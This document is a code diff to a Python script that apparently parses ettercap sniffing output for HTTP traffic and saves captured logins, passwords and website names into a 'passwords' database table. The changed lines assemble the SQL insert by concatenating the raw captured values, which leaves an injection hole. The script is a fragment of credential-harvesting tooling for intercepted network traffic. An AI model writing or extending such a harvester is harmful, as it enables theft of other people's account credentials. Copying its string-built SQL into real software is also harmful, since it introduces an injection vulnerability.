@@ -69,12 +69,17 @@ def stop_mon():
 
 def read_post_file():
 	file=open ("/home/isis/etterout","r")
-	for line in file
+	for line in file:
 		if "http" in line:
 			lineparts = line.split(" ")
-			user = linparts[5]
-			password = lineparts[8]
-			site = lineparts[11]
+			query = "insert into passwords (login,password,website) values\n ('"
+			query += lineparts[5]
+			query += "','"
+			query += lineparts[8]
+			query += "','"
+			query += lineparts[11]
+			query += "');"
+			executequery(query)
 
 def remove_file():
 	os.system("echo top kek") 
